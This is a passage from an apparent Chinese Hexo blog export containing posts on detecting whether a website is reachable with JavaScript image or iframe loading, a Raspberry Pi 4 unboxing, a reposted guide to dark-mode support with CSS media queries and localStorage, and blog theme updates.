class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a 